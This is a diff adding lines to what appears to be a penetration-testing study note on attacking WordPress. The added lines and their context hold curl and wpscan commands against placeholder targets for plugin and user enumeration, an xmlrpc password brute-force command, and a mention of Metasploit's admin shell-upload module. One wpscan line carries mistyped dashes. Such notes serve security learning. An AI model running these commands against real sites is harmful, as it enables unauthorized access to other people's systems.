@@ -123,6 +123,9 @@ e can also find information about the installed plugins by reviewing the source 
 zero@pio$ curl -s -X GET http://<TARGET> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 ```
 
+> Check also `http://<TARGET>/?p=1`
+{: .prompt-tip}
+
 - Themes 
 
 ```console
@@ -156,6 +159,11 @@ The second method requires interaction with the JSON endpoint, which allows us t
 zero@pio$ curl http://<TARGET>/wp-json/wp/v2/users | jq
 ```
 
+We can use wpscan:
+```console
+zero@pio$ wpscan –-url http://<TARGET> –-enumerate u
+```
+
 ## Login 
 
 Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the `xmlrpc.php`{: .filepath} page. If our POST request against `xmlrpc.php`{: .filepath} contains valid credentials, we will receive the following output:
@@ -174,6 +182,13 @@ zero@pio$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName>
 ```
 
 If the credentials are not valid, we will receive a **403 faultCode error**. We can enumerate the aviable methods replacing `wp.getUsersBlogs` by `system.listMethods`.
+
+We can try bruteforcing with wpscan:
+```console
+zero@pio$ sudo wpscan --password-attack xmlrpc -t 20 -U <USER> -P <WORDLIST> --url http://<TARGET>
+```
+
+Also, the `use exploit/unix/webapp/wp_admin_shell_upload` module from Metasploit could help us.
 
 ## WPScan 
 
